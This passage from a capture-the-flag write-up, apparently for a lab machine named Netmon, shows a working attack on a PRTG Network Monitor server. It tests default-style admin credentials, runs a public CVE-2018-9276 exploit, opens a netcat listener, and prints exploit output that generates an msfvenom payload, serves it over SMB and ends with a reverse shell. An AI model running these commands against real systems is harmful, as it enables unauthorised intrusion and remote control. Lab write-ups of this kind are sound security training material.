Testing the found credentials prtgadmin:PrTg@dmin2018 seem that don't work but trying other passwords we find prtgadmin:PrTg@dmin2019. After studying the platform we search for some exploits and we decide to use **[this exploit](https://github.com/A1vinSmith/CVE-2018-9276)**. We setup a netcat listener with `nc -nlvp 8000` command and we got a shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Netmon-10.10.10.152]
└─$ ./exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.14.4 --lport 8000 --user prtgadmin --password PrTg@dmin2019
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.10.10.152:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.14.4 LPORT=8000 OUTPUT=/tmp/icwitnrc.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/Documents/Boxes/Netmon-10.10.10.152/./exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/Documents/Boxes/Netmon-10.10.10.152/./exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.14.4\LYJGSOZL]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.14.4:8000 for the reverse shell!]
listening on [any] 8000 ...
[*] Incoming connection (10.10.10.152,50215)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
```
